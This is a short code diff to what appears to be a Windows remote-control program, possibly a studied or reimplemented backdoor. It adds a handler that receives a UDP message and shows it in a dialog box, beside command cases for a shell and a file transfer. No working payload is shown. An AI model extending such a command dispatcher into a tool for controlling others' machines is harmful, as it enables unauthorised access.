@@ -33,6 +33,8 @@ int __cdecl main(int argc, char **argv)
 {
     int iResult, sig;
     char buf[1024];
+    memset(buf, 0, sizeof(buf));
+    int r;
     SOCKET ListenSocket = INVALID_SOCKET;
     SOCKET sock_tcp = INVALID_SOCKET;
     SOCKET sock_udp = INVALID_SOCKET;
@@ -84,6 +86,12 @@ int __cdecl main(int argc, char **argv)
                 break;
             case _SIG_COUT:
                 DBGLG("Got COUT\n");
+                if ((r = recvfrom(sock_udp, buf, sizeof(buf), 0, NULL, NULL)) < 0){
+                    DBGLG("FAiled to recv data for dialog box\n");
+                    break;
+                }
+                printf("Len we got is %d\n", r);
+                SpawnMsgBox(buf);
             /* File transfer, presumably uploading to client */
                 break;
             case _SIG_SHLL:
